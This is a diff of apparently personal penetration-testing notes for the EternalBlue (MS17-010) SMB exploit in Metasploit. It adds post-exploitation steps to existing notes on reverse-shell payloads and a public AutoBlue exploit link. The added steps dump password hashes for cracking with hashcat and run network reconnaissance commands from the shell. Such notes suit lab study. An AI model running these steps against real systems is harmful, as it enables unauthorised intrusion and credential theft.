@@ -148,8 +148,17 @@ search ms17-010
 
 use auxiliary/scanner/smb/smb_ms17_010
 use exploit/windows/smb/ms17_010_eternalblue
+
+sysinfo
 whoami
 hostname
+hashdump  -> crack hashcat
+
+shell
+route print
+system32
+arp -a
+netstat -ano
 
 set payload windows + TAB 
 set payload windows/x64/met + TAB
@@ -160,6 +169,8 @@ try both
 
 payload => windows/x64/shell_reverse_tcp
 payload => windows/x64/shell/reverse_tcp
+
+
 
 Goo -> autoblue Github
 https://github.com/3ndG4me/AutoBlue-MS17-010
